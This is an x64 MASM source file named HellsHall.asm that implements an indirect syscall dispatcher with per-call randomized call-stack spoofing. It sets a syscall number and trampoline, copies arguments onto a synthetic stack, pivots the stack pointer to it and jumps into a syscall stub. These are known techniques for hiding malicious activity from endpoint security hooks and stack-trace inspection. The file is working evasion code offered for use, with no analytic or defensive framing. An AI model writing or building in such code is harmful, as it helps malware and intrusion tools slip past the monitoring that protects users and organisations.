; ==========================================================================
;  HellsHall.asm – Indirect syscall dispatcher with per-call randomized
;  SilentMoonwalk call-stack spoofing.
; ==========================================================================

.data
    g_SSN        DWORD 0
    g_Trampoline QWORD 0
    g_SpoofEnabled DWORD 0

    ALIGN 16
    g_SpoofSyntheticStack QWORD 32 DUP(0) ; active synthetic stack
    g_SpoofSavedRsp QWORD 0               ; RSP before pivot (after pushes)

.code
PUBLIC SetSyscallParams
PUBLIC HellsHallSyscall
PUBLIC g_SpoofEnabled
PUBLIC g_SpoofSyntheticStack
PUBLIC g_SpoofSavedRsp

; C helper that picks a random config and copies it into g_SpoofSyntheticStack.
; Uses C calling convention — avoids MASM LEA encoding issues with EXTERN data.
EXTERN StackSpoof_CopyRandomConfig:PROC

SetSyscallParams PROC
    mov [g_SSN], ecx
    mov [g_Trampoline], rdx
    ret
SetSyscallParams ENDP

HellsHallSyscall PROC
      cmp [g_SpoofEnabled], 0
      jne SpoofPath

      mov eax, [g_SSN]
      mov r11, [g_Trampoline]
      mov r10, rcx
      jmp r11

  SpoofPath:
      push rbx

      ; Save volatile regs holding syscall args — C ABI may clobber them.
      push rcx
      push rdx
      push r8
      push r9
      sub  rsp, 20h            ; shadow space (5 pushes → RSP 16-byte aligned here)
      call StackSpoof_CopyRandomConfig
      add  rsp, 20h
      pop  r9
      pop  r8
      pop  rdx
      pop  rcx
      ; RSP is now entry_RSP - 8 (only push rbx above); arg offsets unchanged.

      ; Forward stack-based args (5..10)
      mov  rax, [rsp + 30h]
      mov  qword ptr [g_SpoofSyntheticStack + 28h], rax
      mov  rax, [rsp + 38h]
      mov  qword ptr [g_SpoofSyntheticStack + 30h], rax
      mov  rax, [rsp + 40h]
      mov  qword ptr [g_SpoofSyntheticStack + 38h], rax
      mov  rax, [rsp + 48h]
      mov  qword ptr [g_SpoofSyntheticStack + 40h], rax
      mov  rax, [rsp + 50h]
      mov  qword ptr [g_SpoofSyntheticStack + 48h], rax
      mov  rax, [rsp + 58h]
      mov  qword ptr [g_SpoofSyntheticStack + 50h], rax

      lea  rbx, AfterJmpPoint
      mov  [g_SpoofSavedRsp], rsp
      lea  rsp, g_SpoofSyntheticStack

      mov  eax, [g_SSN]
      mov  r11, [g_Trampoline]
      mov  r10, rcx
      jmp  r11

  AfterJmpPoint:
      mov  rsp, [g_SpoofSavedRsp]
      pop  rbx
      ret

  HellsHallSyscall ENDP

  END
